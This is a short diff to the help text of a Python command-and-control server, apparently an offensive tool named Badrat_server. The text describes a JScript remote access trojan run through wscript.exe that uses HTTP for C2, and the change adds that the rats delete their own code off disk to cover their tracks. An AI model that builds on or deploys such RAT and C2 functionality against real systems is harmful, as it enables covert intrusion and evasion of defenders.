@@ -149,12 +149,13 @@ def get_help():
     print("-------------------------------------------------------------------------")
     print("")
     print("Extra things to know:")
-    print("The agent/rat is written in Windows JScript and executed with wscript.exe")
+    print("The agent/rat is written in Windows JScript and runs in a wscript.exe process")
     print("The server is written in python and uses an HTTP listener for C2 comms")
     print("Rats are SINGLE THREADED, which means long running commands will lock up the rat. Try spawning a new rat before running risky commands")
     print("Command output is written to files in the %TEMP% directory, fetched, then the file is deleted")
-    print("Spawned rats write their rat code to %TEMP% and currently don't clean themselves up because Windows can't delete files while in use")
-    print("Use absolute paths. Badrat_server does not keep track of current directory")
+    print("Rats try to delete its own code off disk when first started or before quitting. Applies to both double clicked rats and spawned rats.")
+    print("Use absolute paths. Do not cd. Badrat_server does not keep track of current directory")
+    print("Rats currently cannot run the same command twice in a row due to limitations in the rat code")
     print("Rat communications are NOT SECURE. Do not send sensitive info through the C2 channel\n")
 
 if __name__ == "__main__":
